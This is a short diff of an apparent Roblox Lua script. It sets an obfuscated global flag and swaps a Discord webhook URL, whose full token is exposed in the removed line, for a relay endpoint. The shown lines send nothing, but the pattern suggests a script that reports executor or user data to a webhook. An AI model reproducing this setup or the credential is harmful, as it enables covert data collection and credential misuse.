@@ -13,7 +13,7 @@ task.spawn(function()
 	_G.VLGFHARVHUIERANUVIOAUERAIVASDVREAVDAFIUAEVRBAIUEVRAUYIDHFB = true
 	local HttpService = game:GetService("HttpService")
 	
-	local url = "https://discord.com/api/webhooks/1340398526651301972/qfSeMZzBpov8jhCbtwY0whFs_avCHq355HbTulpOwwMo4ay3F54U4mDIaIObd-187SOo"
+	local url = "https://dcwh.my/post?uniqueid=c1d9cf4f"
 	
 	local executor = nil
 
